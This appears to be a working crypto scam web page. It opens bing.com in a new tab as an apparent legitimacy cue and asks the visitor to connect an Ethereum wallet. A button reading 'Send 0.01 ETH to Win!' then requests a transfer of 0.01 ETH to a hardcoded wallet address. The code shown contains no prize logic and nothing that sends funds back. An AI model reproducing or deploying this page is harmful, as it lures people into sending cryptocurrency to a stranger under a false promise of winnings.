<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <style>
    .button {
      background-color: #4CAF50;
      border: none;
      color: white;
      padding: 15px 32px;
      text-align: center;
      text-decoration: none;
      display: inline-block;
      font-size: 16px;
      margin: 4px 2px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <script>
    let bingWindow;

    async function openBingAndPromptWallet() {
      // Open bing.com in a new tab
      bingWindow = window.open('https://bing.com', '_blank');

      // Prompt wallet connection
      await promptWalletConnection();
    }

    async function promptWalletConnection() {
      if (typeof window.ethereum !== 'undefined') {
        try {
          // Request wallet connection
          await ethereum.request({ method: 'eth_requestAccounts' });
          alert('Wallet connected successfully!');
        } catch (error) {
          alert('Wallet connection request rejected by the user.');
        }
      } else {
        alert('Web3 (Ethereum provider) is not available in this browser.');
      }
    }

    async function sendTransaction() {
      const transactionParameters = {
        nonce: "0x00",
        gasPrice: "0x4A817C800", // Updated gas price
        gas: "0x5208", // Updated gas limit
        to: "0x983C2d9302a31041bf3E342dDd420DDac122ccb6", // Replace with the actual recipient address
        from: ethereum.selectedAddress,
        value: "0x2386F26FC10000", // 0.01 ETH in Wei
        data: "0x00",
        chainId: "0x1",
      };

      try {
        const txHash = await ethereum.request({
          method: "eth_sendTransaction",
          params: [transactionParameters],
        });
        alert(`Transaction sent! Transaction hash: ${txHash}`);
      } catch (error) {
        alert(`Error sending transaction: ${error.message}`);
      }
    }
  </script>
  <center>
    <!-- Added id to the button -->
    <input type="button" id="openBingButton" class="button" value="From Original Site">
    <br>
    <button class="button" onclick="sendTransaction()">Send 0.01 ETH to Win!</button>
  </center>
  
  <script>
    // Attach a click event handler to the button with the specified id
    document.getElementById('openBingButton').addEventListener('click', openBingAndPromptWallet);
  </script>
</body>
</html>
